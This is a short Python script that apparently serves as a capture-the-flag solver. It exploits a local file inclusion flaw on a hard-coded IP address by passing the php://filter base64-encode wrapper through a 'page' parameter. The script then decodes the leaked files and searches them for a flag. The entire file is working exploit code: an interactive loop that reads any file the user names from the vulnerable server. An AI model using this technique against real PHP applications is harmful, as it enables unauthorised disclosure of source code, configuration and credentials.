from requests import *
from termcolor import colored
import base64

lfi = 'php://filter/convert.base64-encode/resource='
url = 'http://140.115.59.13:8764/?page='

while True:
    target = raw_input( colored('target>', 'green') )

    res = get( url + lfi + target )
    leak = res.content.split()
    """
    for i , c in enumerate(leak):
        print i , c
    """
    try:
        tar_de = base64.b64decode(leak[92])
    except:
        print 'Maybe no this resource.'
        continue

    print res
    print tar_de
    flag = ''.join( c for c in tar_de.split() if c.startswith('AD{') )
    if flag:
        print colored( 'Find the Flag !' , 'yellow' ) , colored( flag , 'green' )
